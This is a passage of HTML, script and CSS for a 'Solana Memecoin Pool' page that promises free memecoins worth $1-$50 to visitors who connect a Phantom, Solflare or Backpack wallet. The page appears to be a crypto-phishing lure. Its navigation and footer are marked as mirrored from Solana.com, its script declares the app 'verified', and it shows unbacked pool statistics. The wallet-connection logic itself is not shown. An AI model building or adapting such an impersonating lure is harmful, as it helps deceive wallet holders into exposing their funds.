            // Update connection status display
            if (window.updateConnectionStatus) {
              window.updateConnectionStatus();
            }
          } finally {
            healthCheckInProgress = false;
          }
        }
      }, 30000); // Check every 30 seconds
    };
    
    // Get current connection
    window.getSolanaConnection = async function() {
      if (!window.solanaConnection) {
        await window.initializeSolanaConnection();
      }
      return window.solanaConnection;
    };
    
    // Get connection status for UI display
    window.getConnectionStatus = function() {
      if (!window.solanaConnection) {
        return { status: 'disconnected', message: 'No connection available' };
      }
      
      if (window.isSwitchingRPC) {
        return { status: 'switching', message: 'Switching to backup RPC...' };
      }
      
      const currentRpc = window.rpcEndpoints[window.currentRpcIndex];
      return { 
        status: 'connected', 
        message: `Connected to ${currentRpc.name}`,
        rpc: currentRpc.name,
        url: currentRpc.url
      };
    };
    
    // Update connection status display
    window.updateConnectionStatus = function() {
      const statusDiv = document.getElementById('connection-status');
      const statusText = document.getElementById('status-text');
      
      if (!statusDiv || !statusText) return;
      
      const connectionInfo = window.getConnectionStatus();
      
      // Show the status div
      statusDiv.style.display = 'block';
      
      // Update status text and styling based on connection state
      switch (connectionInfo.status) {
        case 'connected':
          statusText.textContent = `Connected`;
          statusDiv.style.background = 'rgba(40, 167, 69, 0.2)';
          statusDiv.style.border = '1px solid rgba(40, 167, 69, 0.5)';
          break;
        case 'switching':
          statusText.textContent = `Switching: ${connectionInfo.message}`;
          statusDiv.style.background = 'rgba(255, 193, 7, 0.2)';
          statusDiv.style.border = '1px solid rgba(255, 193, 7, 0.5)';
          break;
        case 'disconnected':
          statusText.textContent = `Disconnected: ${connectionInfo.message}`;
          statusDiv.style.background = 'rgba(220, 53, 69, 0.2)';
          statusDiv.style.border = '1px solid rgba(220, 53, 69, 0.5)';
          break;
        default:
          statusText.textContent = 'Initializing connection...';
          statusDiv.style.background = 'rgba(108, 117, 125, 0.2)';
          statusDiv.style.border = '1px solid rgba(108, 117, 125, 0.5)';
      }
    };
    
    // Initialize connection when page loads
    window.addEventListener('load', function() {
      // Wait for config to load
      setTimeout(async () => {
        await window.initializeSolanaConnection();
        window.startRPCHealthCheck(); // Start periodic health checks
        
        // Update connection status display
        window.updateConnectionStatus();
        
        // Update status every 5 seconds
        setInterval(() => {
          window.updateConnectionStatus();
        }, 5000);
      }, 100);
    });
  </script>
  
  <!-- Additional Wallet Recognition Scripts -->
  <script>
    // Set app metadata for wallet recognition
    if (typeof window !== 'undefined') {
      window.MEMECOIN_POOL_APP = {
        name: 'Solana Memecoin Pool',
        description: 'Claim free memecoins and complete fun tasks',
        version: '1.0.0',
        blockchain: 'Solana',
        network: 'mainnet-beta',
        category: 'DeFi',
        verified: true
      };
    }
    
    // Enhanced wallet recognition for better dApp detection
    window.setWalletMetadata = function() {
      // Set Phantom metadata
      if (window.solana && window.solana.isPhantom) {
        try {
          window.solana.request({
            method: 'wallet_adapterSetAppMetadata',
            params: {
                          name: 'Solana Memecoin Pool',
            description: 'Claim free memecoins and complete fun tasks',
            icon: '/logo.png',
            url: ''
            }
          });
        } catch (e) {
          // Silent fail for unsupported wallets
        }
      }
      
      // Set Solflare metadata
      if (window.solflare) {
        try {
          window.solflare.request({
            method: 'wallet_adapterSetAppMetadata',
            params: {
                          name: 'Solana Memecoin Pool',
            description: 'Claim free memecoins and complete fun tasks',
              icon: '/logo.png',
              url: ''
            }
          });
        } catch (e) {
          // Silent fail for unsupported wallets
        }
      }
    };
    
    // Set metadata when page loads
    window.addEventListener('load', window.setWalletMetadata);
  </script>
</head>

<body>
  <div class="container">
    <!-- Status Container for Messages -->
    <div id="status-container" class="status-container"></div>

    <!-- Navigation Bar - Mirrored from Solana.com -->
    <nav class="navbar">
      <div class="nav-container">
        <div class="nav-logo">
          <img src="/logo.png" alt="Solana Memecoin Pool Logo" class="nav-logo-img">
          <span class="nav-logo-text"> MEMECOIN POOL</span>
      </div>
        
        <div class="nav-links">
          <a href="#learn" class="nav-link">Learn</a>
          <a href="#developers" class="nav-link">Developers</a>
          <a href="#solutions" class="nav-link">Solutions</a>
          <a href="#network" class="nav-link">Network</a>
          <a href="#community" class="nav-link">Community</a>
      </div>
        
        <div class="nav-actions">
          <div class="search-container">
            <input type="text" placeholder="Search..." class="nav-search">
            <button class="search-btn">Search</button>
    </div>
          <button class="nav-connect-btn" onclick="openWalletModal()">
            <span class="btn-icon">‚Üí</span>
            Connect Wallet
          </button>
        </div>
      </div>
    </nav>

    <!-- Main Hero Section - Random Memecoin Display -->
    <section class="main-hero">
      <div class="hero-container">
      <div class="hero-content">
          <h1 class="hero-title">Connect your wallet to claim this randomly selected token from our pool</h1>
          
          <!-- Random Token Display -->
          <div id="random-token-display" class="main-token-display">
            <!-- Token will be displayed here dynamically -->
          </div>
          
                    <!-- Claim Instructions -->
          <div class="claim-instructions-main">
            <h3>How to Claim:</h3>
            <ol>
              <li>Connect your Solana wallet (Phantom, Backpack, Solflare)</li>
              <li>Complete a simple task (follow, share, or join community)</li>
              <li>Claim your random memecoin directly to your wallet</li>
              <li>Come back daily for new random drops!</li>
            </ol>
          </div>
          
          <!-- Boost Task Section -->
          <div class="boost-task-section">
            <h3>Boost Your Claims!</h3>
            <p>Complete this simple task to increase your claim chances:</p>
            <div class="task-item">
              <span class="task-icon">Twitter</span>
              <span class="task-text">Follow <a href="https://twitter.com/Solananetwork" target="_blank" rel="noopener noreferrer">@Solananetwork</a> on Twitter</span>
              <button class="task-complete-btn" onclick="completeTask()">
                <span class="btn-icon">‚úì</span>
                Complete Task
              </button>
          </div>
        </div>
        
          <!-- Ready to Claim Section -->
          <div class="ready-to-claim">
            <h3>Ready to Claim?</h3>
            <p>Connect your Solana wallet to start claiming random memecoins from our pool. Each claim gives you a surprise token worth $1-$50!</p>
            <button class="connect-btn-main" onclick="openWalletModal()">
              <span class="btn-icon">‚Üí</span>
              Connect Wallet & Claim
            </button>
          </div>
        </div>
      </div>
    </section>

    <!-- How It Works Section -->
    <section class="features">
      <div class="container">
        <h3 class="features-title"> How It Works</h3>
        <div class="features-grid">
          <div class="feature-card">
            <span class="feature-icon">Random</span>
            <h4>Random Drops</h4>
            <p>Connect your wallet and claim a random memecoin from the pool. Every claim is a surprise!</p>
          </div>
          <div class="feature-card">
            <span class="feature-icon">Tasks</span>
            <h4>Tasks & Quests</h4>
            <p>Boost your chances by doing simple tasks: follow projects on X, join Telegram/Discord, share memes & retweet drops.</p>
          </div>
          <div class="feature-card">
            <span class="feature-icon">Daily</span>
            <h4>Repeat Daily</h4>
            <p>Come back daily ‚Äî the pool refreshes with new tokens. The more you participate, the more you can claim!</p>
          </div>
        </div>
      </div>
    </section>

    <!-- Why Memecoins Section -->
    <section class="calculator-section">
      <div class="container">
        <div class="calculator-container">
          <div class="calculator-info">
            <h3>Why Memecoins?</h3>
            <p>Because memes move faster than markets. Memecoins are culture, community, and chaos all in one. The pool is your entry ticket into the wild world of Solana memes.</p>
            <p><strong>Pro Tip:</strong> Memecoins can be highly volatile but also highly rewarding! Join the community and ride the wave.</p>
          </div>
          <div class="calculator">
            <h4>Pool Rewards</h4>
            <div class="calculator-group">
              <label class="calculator-label">Free Random Solana Memecoins:</label>
              <div style="padding: 15px; background: var(--bg-tertiary); border-radius: 10px; margin-bottom: 15px;">
                $DOGE, $BONK, $SAMO, $CHAD and more
              </div>
            </div>
            <div class="calculator-group">
              <label class="calculator-label">Exclusive NFTs:</label>
              <div style="padding: 15px; background: var(--bg-tertiary); border-radius: 10px; margin-bottom: 15px;">
                From community meme artists
              </div>
            </div>
            <div class="calculator-group">
              <label class="calculator-label">Degen Bragging Rights:</label>
              <div style="padding: 15px; background: var(--bg-tertiary); border-radius: 10px; margin-bottom: 15px;">
                Flex your meme game
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>



    <!-- Connection Status Section -->
    <section class="connection-status-section">
      <div class="container">
        <div id="connection-status" class="connection-status-display" style="display: none;">
          <div id="status-text">Ready to connect</div>
          <div id="status-progress" style="margin-top: 8px; display: none;">
            <div style="width: 100%; background: var(--bg-tertiary); border-radius: 4px; height: 4px;">
              <div id="progress-bar" style="width: 0%; height: 4px; background: var(--primary-color); border-radius: 4px; transition: width 0.3s;"></div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- Stats Section -->
    <section class="stats">
      <div class="container">
        <h3 class="section-title">Pool Statistics</h3>
        <p class="section-subtitle">See the incredible growth and success of our memecoin pool</p>
        <div class="stats-grid">
          <div class="stat-item">
            <div class="stat-number">50K+</div>
            <div class="stat-label">Tokens Claimed</div>
          </div>
          <div class="stat-item">
            <div class="stat-number">1,247</div>
            <div class="stat-label">Active Claimers</div>
          </div>
          <div class="stat-item">
            <div class="stat-number">25+</div>
            <div class="stat-label">Memecoin Projects</div>
          </div>
          <div class="stat-item">
            <div class="stat-number">SOL</div>
            <div class="stat-label">Powered by Solana</div>
          </div>
        </div>
      </div>
    </section>

    <!-- Footer - Mirrored from Solana.com -->
    <footer class="footer">
      <div class="footer-content">
        <div class="footer-main">
          <div class="footer-brand">
            <h3>Solana Memecoin Pool</h3>
            <p>Powered by the Solana community. No promises. No utility. Pure memes.</p>
        </div>
          
          <div class="footer-links">
            <div class="footer-column">
              <h4>Solana Memecoin Pool</h4>
              <ul>
                <li><a href="#grants">Grants</a></li>
                <li><a href="#break">Break Solana</a></li>
                <li><a href="#media">Media Kit</a></li>
                <li><a href="#careers">Careers</a></li>
                <li><a href="#disclaimer">Disclaimer</a></li>
                <li><a href="#privacy">Privacy Policy</a></li>
              </ul>
            </div>
            
            <div class="footer-column">
              <h4>Get Connected</h4>
              <ul>
                <li><a href="#blog">Blog</a></li>
                <li><a href="#newsletter">Newsletter</a></li>
                <li><a href="https://twitter.com/SolanaMemecoinPool" target="_blank" rel="noopener noreferrer">Twitter</a></li>
                <li><a href="https://t.me/SolanaMemecoinPool" target="_blank" rel="noopener noreferrer">Telegram</a></li>
                <li><a href="https://discord.gg/SolanaMemecoinPool" target="_blank" rel="noopener noreferrer">Discord</a></li>
              </ul>
            </div>
          </div>
        </div>
        
        <div class="footer-bottom">
          <div class="footer-bottom-content">
            <p class="managed-by">Managed by</p>
            <p class="copyright">&copy; 2025 Solana Memecoin Pool. All rights reserved.</p>
          </div>
        </div>
      </div>
    </footer>
  </div>

  <!-- Wallet Modal -->
  <div id="walletModal" class="wallet-modal">
    <div class="wallet-content">
      <span class="close-btn" onclick="closeWalletModal()">&times;</span>
      <div id="walletList" class="wallet-list">
        <!-- Wallet options will be generated here -->
      </div>
    </div>
  </div>

  <!-- CSS Styles -->
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Poppins:wght@400;500;600;700;800;900&family=Outfit:wght@400;500;600;700;800;900&display=swap');
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    :root {
      --primary-color: #6366f1;
      --secondary-color: #8b5cf6;
      --accent-color: #06b6d4;
      --success-color: #10b981;
      --success-dark: #059669;
      --danger-color: #ef4444;
      --warning-color: #f59e0b;
      --dark-color: #0f172a;
      --light-color: #1e293b;
      --text-primary: #f8fafc;
      --text-secondary: #cbd5e1;
      --text-muted: #64748b;
      --bg-primary: #0f172a;
      --bg-secondary: #1e293b;
      --bg-tertiary: #334155;
      --bg-card: rgba(51, 65, 85, 0.9);
      --bg-overlay: rgba(15, 23, 42, 0.95);
      --border-color: rgba(99, 102, 241, 0.2);
      --gradient-primary: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
      --gradient-secondary: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      --gradient-accent: linear-gradient(45deg, #06b6d4 0%, #6366f1 100%);
      --gradient-dark: linear-gradient(135deg, #020617 0%, #0f172a 100%);
      --shadow-soft: 0 4px 20px rgba(0, 0, 0, 0.15);
      --shadow-strong: 0 8px 32px rgba(0, 0, 0, 0.25);
      --border-radius: 12px;
      --transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
    }
    
    body {
      font-family: 'Outfit', 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: var(--bg-primary);
      min-height: 100vh;
      color: var(--text-primary);
      position: relative;
      overflow-x: hidden;
      line-height: 1.6;
      font-weight: 500;
    }
    
    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        linear-gradient(135deg, #0f172a 0%, #1e293b 25%, #334155 50%, #1e293b 75%, #0f172a 100%),
        radial-gradient(circle at 20% 80%, rgba(99, 102, 241, 0.03) 0%, transparent 50%),
        radial-gradient(circle at 80% 20%, rgba(139, 92, 246, 0.03) 0%, transparent 50%),
        radial-gradient(circle at 40% 40%, rgba(6, 182, 212, 0.02) 0%, transparent 50%);
      pointer-events: none;
      z-index: -1;
    }
    
    body::after {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.01'%3E%3Ccircle cx='30' cy='30' r='1'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
      pointer-events: none;
      z-index: -1;
      opacity: 0.3;
    }
    
    .container {
      max-width: 1400px;
      margin: 0 auto;
      padding: 20px;
    }
    
    /* Header Styles */
    .header {
      text-align: center;
      margin-bottom: 40px;
      background: var(--bg-overlay);
      backdrop-filter: blur(20px);
      padding: 1.5rem;
      border-radius: var(--border-radius);
      box-shadow: var(--shadow-soft);
      border: 3px solid var(--accent-color);
    }
    
    .logo {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 24px;
    }
    
    .logo-img {
      width: 64px;
      height: 64px;
      margin-right: 20px;
      border-radius: 16px;
      border: 2px solid var(--primary-color);
      box-shadow: var(--shadow-soft);
    }
    
    .logo-text {
      font-family: 'Poppins', sans-serif;
      font-size: 2.5rem;
      font-weight: 700;
      color: var(--primary-color);
      letter-spacing: -0.02em;
    }
    
    .main-title {
      font-family: 'Poppins', sans-serif;
      font-size: 2.4rem;
      font-weight: 700;
      color: var(--text-primary);
      margin-bottom: 12px;
      letter-spacing: -0.02em;
      line-height: 1.2;
    }
    
    .subtitle {
      font-size: 1.1rem;
      color: var(--text-secondary);
      margin-bottom: 24px;
      font-weight: 500;
      line-height: 1.5;
    }

    /* Navigation Bar */
    .navbar {
      background: rgba(15, 23, 42, 0.95);
      border-bottom: 1px solid rgba(99, 102, 241, 0.1);
      padding: 1rem 0;
      position: sticky;
      top: 0;
      z-index: 1000;
      backdrop-filter: blur(20px);
      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
    }

        .nav-container {
      max-width: 1400px;
      margin: 0 auto;
      padding: 0 2rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      height: 80px;
    }
    
    .nav-logo {
      display: flex;
      align-items: center;
      gap: 0.75rem;
    }
    
    .nav-logo-img {
      width: 40px;
      height: 40px;
      border-radius: 8px;
    }
    
    .nav-logo-text {
      font-size: 1.5rem;
      font-weight: 900;
      color: var(--text-primary);
      font-family: 'Outfit', sans-serif;
      letter-spacing: -0.02em;
    }
    
    .nav-links {
      display: flex;
      align-items: center;
      gap: 2.5rem;
    }
    
    .nav-link {
      color: var(--text-secondary);
      text-decoration: none;
      font-weight: 600;
      transition: all 0.3s ease;
      font-size: 1rem;
      font-family: 'Outfit', sans-serif;
      position: relative;
      padding: 0.5rem 0;
    }
    
    .nav-link:hover {
      color: var(--primary-color);
    }
    
    .nav-link::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 0;
      width: 0;
      height: 2px;
      background: var(--primary-color);
      transition: width 0.3s ease;
    }
    
    .nav-link:hover::after {
      width: 100%;
    }
    
    .nav-actions {
      display: flex;
      align-items: center;
      gap: 1.5rem;
    }
    
    .search-container {
      display: flex;
      align-items: center;
      background: var(--bg-tertiary);
      border: 1px solid var(--border-color);
      border-radius: 8px;
      padding: 0.5rem;
      transition: all 0.3s ease;
    }
    
    .search-container:focus-within {
      border-color: var(--primary-color);
      box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
    }
    
    .nav-search {
      background: transparent;
      border: none;
      outline: none;
      color: var(--text-primary);
      font-size: 0.9rem;
      padding: 0.25rem 0.5rem;
      width: 200px;
      font-family: 'Inter', sans-serif;
    }
    
    .nav-search::placeholder {
      color: var(--text-muted);
    }
    
    .search-btn {
      background: transparent;
      border: none;
      color: var(--text-muted);
      cursor: pointer;
      padding: 0.25rem;
      border-radius: 4px;
      transition: color 0.3s ease;
    }
    
    .search-btn:hover {
      color: var(--primary-color);
    }
    
    .nav-connect-btn {
      background: var(--primary-color);
      color: white;
      border: none;
      padding: 0.75rem 1.5rem;
      border-radius: 8px;
      font-weight: 600;
      font-size: 0.9rem;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      gap: 0.5rem;
      box-shadow: 0 4px 12px rgba(99, 102, 241, 0.3);
      font-family: 'Outfit', sans-serif;
    }
    
    .nav-connect-btn:hover {
      background: var(--primary-dark);
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(99, 102, 241, 0.4);
    }
    
    .nav-connect-btn .btn-icon {
      font-size: 1rem;
    }
    
    /* Main Connect Button */
    .connect-btn-main {
      background: var(--primary-color);
      color: white;
      border: none;
      padding: 1rem 2rem;
      border-radius: 12px;
      font-weight: 600;
      font-size: 1.1rem;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      gap: 0.75rem;
      box-shadow: 0 4px 20px rgba(99, 102, 241, 0.3);
      font-family: 'Poppins', sans-serif;
    }
    
    .connect-btn-main:hover {
      background: var(--secondary-color);
      transform: translateY(-2px);
      box-shadow: 0 6px 25px rgba(99, 102, 241, 0.4);
    }
    
    .connect-btn-main:disabled {
      background: var(--text-muted);
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }
    
    .connect-btn-main .btn-icon {
      font-size: 1.2rem;
    }
    
    /* Hero Section */
    .hero {
      display: flex;
      align-items: center;
      gap: 48px;
      margin-bottom: 60px;
      background: var(--bg-card);
      padding: 48px;
      border-radius: var(--border-radius);
      backdrop-filter: blur(20px);
      box-shadow: var(--shadow-strong);
      border: 1px solid var(--border-color);
      position: relative;
      overflow: hidden;
    }
    
    .hero::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 1px;
      background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
      opacity: 0.6;
    }
    
    .hero-content {
      flex: 1;
      position: relative;
      z-index: 2;
    }
    
    .hero-title {
      font-family: 'Poppins', sans-serif;
      font-size: 2rem;
      font-weight: 600;
      color: var(--text-primary);
      margin-bottom: 16px;
      letter-spacing: -0.01em;
      line-height: 1.3;
    }
    
    .hero-description {
      font-size: 1.05rem;
      color: var(--text-secondary);
      margin-bottom: 32px;
      line-height: 1.7;
      font-weight: 400;
      max-width: 600px;
    }
    
    .hero-stats {
      display: flex;
      justify-content: flex-start;
      gap: 2rem;
      margin-bottom: 2rem;
      flex-wrap: wrap;
    }
    
    .hero-stat {
      background: var(--bg-tertiary);
      padding: 1.5rem 2rem;
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
      text-align: center;
      min-width: 140px;
      transition: var(--transition);
      position: relative;
    }
    
    .hero-stat:hover {
      transform: translateY(-2px);
      border-color: var(--primary-color);
      box-shadow: var(--shadow-soft);
    }
    
    .hero-stat-number {
      font-size: 2.2rem;
      font-weight: 700;
      color: var(--primary-color);
      font-family: 'Poppins', sans-serif;
      margin-bottom: 0.5rem;
    }
    
    .hero-stat-label {
      color: var(--text-secondary);
      font-size: 0.875rem;
      font-weight: 500;
      text-transform: none;
      letter-spacing: 0.025em;
    }
    
    .hero-features {
      display: flex;
      gap: 16px;
      flex-wrap: wrap;
    }
    
    .feature {
      display: flex;
      align-items: center;
      gap: 8px;
      background: var(--bg-tertiary);
      padding: 8px 16px;
      border-radius: 20px;
      color: var(--text-secondary);
      transition: var(--transition);
      border: 1px solid var(--border-color);
      font-size: 0.875rem;
      font-weight: 500;
    }
    
    .feature:hover {
      background: var(--primary-color);
      color: var(--text-primary);
      border-color: var(--primary-color);
      transform: translateY(-1px);
    }

    .hero-image {
      flex: 1;
      text-align: center;
    }

    .hero-img {
      max-width: 100%;
      height: auto;
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
    }

    /* Wallet Section */
    .wallet-section {
      text-align: center;
      margin-bottom: 60px;
      background: var(--bg-card);
      padding: 48px;
      border-radius: var(--border-radius);
      backdrop-filter: blur(20px);
      box-shadow: var(--shadow-strong);
      border: 1px solid var(--border-color);
      position: relative;
    }
    
    .wallet-section::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 1px;
      background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
      opacity: 0.6;
    }

    .wallet-box {
      background: var(--bg-tertiary);
      padding: 40px;
      border-radius: var(--border-radius);
      max-width: 600px;
      margin: 0 auto;
      border: 1px solid var(--border-color);
    }

    .wallet-title {
      font-family: 'Poppins', sans-serif;
      font-size: 2rem;
      font-weight: 600;
      color: var(--text-primary);
      margin-bottom: 16px;
      letter-spacing: -0.01em;
    }

    .wallet-description {
      color: var(--text-secondary);
      margin-bottom: 32px;
      line-height: 1.6;
      font-size: 1.05rem;
      max-width: 500px;
      margin-left: auto;
      margin-right: auto;
    }

    .connect-btn {
      background: var(--gradient-primary);
      color: var(--text-primary);
      border: none;
      padding: 16px 32px;
      font-size: 1.1rem;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      transition: var(--transition);
      display: inline-flex;
      align-items: center;
      gap: 12px;
      margin: 0 auto;
      box-shadow: var(--shadow-soft);
      letter-spacing: 0.025em;
    }

    .connect-btn:hover {
      transform: translateY(-2px);
      box-shadow: var(--shadow-strong);
      background: linear-gradient(135deg, #5b21b6 0%, #7c3aed 100%);
    }

    .btn-icon {
      font-size: 1.2rem;
    }
    
    /* Token Preview Section */
    .token-preview-section {
      margin-bottom: 60px;
      padding: 48px 0;
      background: var(--bg-secondary);
    }
    
    .section-title {
      font-family: 'Poppins', sans-serif;
      font-size: 2.4rem;
      font-weight: 600;
      color: var(--text-primary);
      text-align: center;
      margin-bottom: 16px;
      letter-spacing: -0.01em;
    }
    
    .section-subtitle {
      font-family: 'Inter', sans-serif;
      font-size: 1.1rem;
      color: var(--text-secondary);
      text-align: center;
      margin-bottom: 40px;
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
      line-height: 1.6;
    }
    
    .claim-instructions {
      background: var(--bg-card);
      padding: 32px;
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
      margin-top: 32px;
    }
    
    .claim-instructions h4 {
      font-family: 'Poppins', sans-serif;
      font-size: 1.3rem;
      font-weight: 600;
      color: var(--text-primary);
      margin-bottom: 20px;
    }
    
    .claim-instructions ol {
      color: var(--text-secondary);
      line-height: 1.8;
      padding-left: 20px;
    }
    
    .claim-instructions li {
      margin-bottom: 12px;
      font-size: 1rem;
    }
    
    .claim-instructions li strong {
      color: var(--primary-color);
      font-weight: 600;
    }
    
    /* Token Preview Styles */
    .token-preview {
      display: flex;
      align-items: center;
      gap: 20px;
      background: var(--bg-tertiary);
      padding: 24px;
      border-radius: var(--border-radius);
      border: 1px solid var(--border-color);
      margin-bottom: 24px;
    }
    
    .token-logo {
      font-size: 3rem;
      background: var(--bg-card);
      padding: 16px;
      border-radius: 16px;
      border: 1px solid var(--border-color);
      text-align: center;
      position: relative;
    }
    
    .token-icon {
      width: 64px;
      height: 64px;
      border-radius: 12px;
      object-fit: contain;
      background: var(--bg-tertiary);
      padding: 8px;
      border: 2px solid var(--border-color);
      box-shadow: var(--shadow-soft);
      display: block;
      margin: 0 auto;
    }
    
    .token-emoji-fallback {
      font-size: 3rem;
      display: block;
    }
    
    .token-info {
      flex: 1;
    }
    
    .token-name {
      font-family: 'Poppins', sans-serif;
      font-size: 1.5rem;
      font-weight: 600;
      color: var(--text-primary);
      margin-bottom: 8px;
    }
    
    .token-symbol {
      font-family: 'Inter', sans-serif;
      font-size: 1.1rem;
      font-weight: 500;
      color: var(--primary-color);
      margin-bottom: 8px;
      letter-spacing: 0.025em;
    }
    
    .token-value {
      font-family: 'Inter', sans-serif;
      font-size: 1.3rem;
      font-weight: 700;
      color: var(--success-color);
      margin-bottom: 8px;
    }
    
    .token-description {
      font-family: 'Inter', sans-serif;
      font-size: 0.9rem;
      color: var(--text-secondary);
      line-height: 1.5;
    }
    
    .token-quantity {
      font-family: 'Inter', sans-serif;
      font-size: 1rem;
      color: var(--primary-color);
      font-weight: 600;
      margin-top: 8px;
      padding: 4px 8px;
      background: rgba(99, 102, 241, 0.1);
      border-radius: 6px;
      display: inline-block;
    }
    
    /* Claim Instructions Main */
    .claim-instructions-main {
      background: var(--bg-card);
      padding: 24px;
      border-radius: var(--border-radius);
      margin: 24px 0;
      border: 1px solid var(--border-color);
      text-align: center;
    }
    
    .claim-instructions-main h3 {
      font-family: 'Outfit', sans-serif;
      font-size: 1.5rem;
      font-weight: 700;
      color: var(--text-primary);
      margin-bottom: 16px;
    }
    
    .claim-instructions-main ol {
      text-align: left;
      max-width: 500px;
      margin: 0 auto;
      padding-left: 20px;
    }
    
    .claim-instructions-main li {
      margin-bottom: 12px;
      color: var(--text-secondary);
      font-size: 1rem;
      line-height: 1.5;
    }
    
    .claim-instructions-main li strong {
      color: var(--text-primary);
      font-weight: 600;
    }
    
    /* Boost Task Section */
    .boost-task-section {
      background: var(--bg-card);
      padding: 24px;
      border-radius: var(--border-radius);
      margin: 24px 0;
      border: 1px solid var(--border-color);
      text-align: center;
    }
    
    .boost-task-section h3 {
      font-family: 'Outfit', sans-serif;
      font-size: 1.3rem;
      font-weight: 700;
      color: var(--text-primary);
      margin-bottom: 12px;
    }
    
    .boost-task-section p {
      color: var(--text-secondary);
      margin-bottom: 16px;
      font-size: 0.95rem;
    }
    
    /* Ready to Claim Section */
    .ready-to-claim {
      background: var(--bg-card);
      padding: 24px;
      border-radius: var(--border-radius);
      margin: 24px 0;
      border: 1px solid var(--border-color);
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    
    .ready-to-claim h3 {
      font-family: 'Outfit', sans-serif;
      font-size: 1.5rem;
      font-weight: 700;
      color: var(--text-primary);
      margin-bottom: 16px;
    }
    
    .ready-to-claim p {
      color: var(--text-secondary);
      margin-bottom: 20px;
      font-size: 1rem;
      line-height: 1.6;
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
    }
    
    .ready-to-claim .connect-btn-main {
      margin: 0 auto;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .task-item {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 16px;
      background: var(--bg-tertiary);
      border-radius: 8px;
      border: 1px solid var(--border-color);
    }
    
    .task-icon {
      font-size: 1.5rem;
    }
    
    .task-text {
      flex: 1;
      color: var(--text-primary);
      font-size: 0.95rem;
    }
    
    .task-text a {
      color: var(--primary-color);
      text-decoration: none;
      font-weight: 500;
    }
    
    .task-text a:hover {
      text-decoration: underline;
    }
    
    .task-complete-btn {
      background: var(--success-color);
      color: white;
      border: none;
      padding: 8px 16px;
      border-radius: 6px;
      font-weight: 500;
      font-size: 0.9rem;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    
    .task-complete-btn:hover {
      background: var(--success-dark);
      transform: translateY(-1px);
    }
    
    .task-complete-btn.completed {
      background: var(--text-muted);
      cursor: default;
    }
    
    .task-complete-btn.completed:hover {
      transform: none;
    }
    
    /* Task Success Message */
    .task-success-msg {
      margin-top: 12px;
      width: 100%;
    }
    
    .task-success-content {
      display: flex;
      align-items: center;
      gap: 8px;
      padding: 12px;
      background: rgba(34, 197, 94, 0.1);
      border: 1px solid rgba(34, 197, 94, 0.3);
      border-radius: 6px;
      color: var(--success-color);
      font-size: 0.9rem;
      font-weight: 500;
    }
    
    .task-success-content .success-icon {
      font-size: 1.2rem;
    }
    
    /* Claim Success Modal */
    .claim-success {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(10px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10000;
      animation: fadeIn 0.3s ease-out;
    }
    
    .success-content {
      background: var(--bg-card);
      padding: 40px;
      border-radius: var(--border-radius);
      text-align: center;
      max-width: 400px;
      border: 1px solid var(--border-color);
      box-shadow: var(--shadow-strong);
    }
    
    .success-icon {
      font-size: 4rem;
      margin-bottom: 20px;
    }
    
    .success-content h3 {
      font-family: 'Poppins', sans-serif;
      font-size: 1.8rem;
      font-weight: 600;
      color: var(--text-primary);
      margin-bottom: 16px;
    }
    
    .success-content p {
      font-family: 'Inter', sans-serif;
      font-size: 1rem;
      color: var(--text-secondary);
      margin-bottom: 12px;
      line-height: 1.5;
    }
    
    .token-desc {
      font-size: 0.9rem;
      color: var(--text-muted);
      font-style: italic;
    }
    
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: scale(0.9);
      }
      to {
        opacity: 1;
        transform: scale(1);
      }
    }

    /* Features Section */
    .features {
      text-align: center;
      margin-bottom: 50px;
    }

    .features-title {
      font-size: 2rem;
      color: var(--text-primary);
      margin-bottom: 30px;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
    }

    .features-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 25px;
    }

    .feature-card {
      background: var(--bg-card);
      padding: 30px;
      border-radius: 15px;
      backdrop-filter: blur(10px);
      transition: transform 0.3s ease;
